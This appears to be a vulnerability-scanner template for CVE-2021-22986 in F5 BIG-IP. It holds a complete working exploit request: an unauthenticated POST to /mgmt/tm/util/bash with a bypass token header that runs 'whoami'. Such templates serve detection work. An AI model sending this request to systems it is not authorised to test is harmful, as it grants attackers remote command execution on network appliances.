name: F5_BIGIP_iControl_unauth_RCE__CVE_2021_22986
transport: http
detail:
  dock: title="BIG-IP" || app="F5-BIGIP"
  product: F5-BIGIP
  homepage: https://support.f5.com
  impact: This vulnerability allows for unauthenticated attackers with network access
    to the iControl REST interface, through the BIG-IP management interface and self
    IP addresses, to execute arbitrary system commands, create or delete files, and
    disable services. This vulnerability can only be exploited through the control
    plane and cannot be exploited through the data plane. Exploitation can lead to
    complete system compromise. The BIG-IP system in Appliance mode is also vulnerable.
  description: F5 Big-IP, an application delivery platform for F5 Corporation, issued
    a security bulletin today, announcing seven security vulnerabilities related to
    Big-IP and Big-IQ.Among them, CVE-2021-22986 is an unauthenticated remote command
    execution vulnerability. Due to incomplete authentication of HTTP requests, it
    allows attackers to bypass permission authentication and access Big-IP REST API
    to execute commands by setting special HTTP headers.
rules:
  r1:
    method: POST
    path: /mgmt/tm/util/bash
    follow_redirects: false
    headers:
      Content-Type: application/json
      X-F5-Auth-Token: ''
      Authorization: YWRtaW46QVNhc1M=
    body: {\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}
    expression: response.status == 200 && response.body.bcontains(b"kind")
expression: r1()
